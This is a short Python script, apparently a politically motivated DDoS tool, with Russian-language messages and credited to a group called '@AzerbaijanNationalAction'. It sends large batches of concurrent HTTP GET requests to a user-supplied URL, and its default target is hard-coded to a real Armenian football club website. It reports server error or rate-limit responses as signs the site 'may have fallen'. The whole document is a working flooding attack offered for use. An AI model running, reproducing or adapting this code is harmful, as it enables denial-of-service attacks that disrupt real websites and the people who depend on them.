import asyncio
import aiohttp
import colorama
import pyfiglet
import sys

url = "https://www.fcararat.am/ru/"
AZNA_label = pyfiglet.figlet_format("AZNA")
threads = 100
ammount = 100
async def make_request():
    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(url) as response:
                try:
                    status = response.status
                    if status > 199 and status < 300:
                        print(colorama.Fore.LIGHTBLUE_EX, f"Запрос отправлен({url}) со статусом: {status}(пока еще держится)", colorama.Style.RESET_ALL)
                    elif status in [500,503,502,504,403,429]:
                        print(colorama.Fore.GREEN, f"Запрос отправлен({url}) со статусом: {status}(возможно упал)", colorama.Style.RESET_ALL)
                    else:
                        print(colorama.Fore.YELLOW, f"Запрос отправлен({url}) со статусом: {status}(статус не известен)", colorama.Style.RESET_ALL)
                except Exception as e:
                    print(colorama.Fore.RED, f"Произошла Ошибка: {str(e)}", colorama.Style.RESET_ALL)
    except Exception as e:
        print(colorama.Fore.RED, f"Произошла Ошибка: {str(e)}", colorama.Style.RESET_ALL)
async def requests_per_thread():
    tasks = []
    for _ in range(ammount):
        task = asyncio.create_task(make_request())
        tasks.append(task)
    await asyncio.gather(*tasks)

async def startDdos():
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(requests_per_thread())
        tasks.append(task)
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    try:
        print(colorama.Fore.LIGHTBLUE_EX, AZNA_label, colorama.Style.RESET_ALL)
        print(colorama.Fore.GREEN, "Сдеалано wndkx(tg: @wwndkxx, https://github.com/wndkx/) для @AzerbaijanNationalAction", colorama.Style.RESET_ALL)
        try:
            threads = int(input(f"{colorama.Fore.GREEN}Введите кол-во потоков(в каждом потоке по 100 запросов): "))
        except ValueError or TypeError:
            print(colorama.Fore.RED, "Введите число!")
            sys.exit(1)
        url = input(f"Введите URL: ")
        print("Начинаю DDOS..", colorama.Style.RESET_ALL)
        asyncio.run(startDdos())
    except KeyboardInterrupt:
        sys.exit(0)
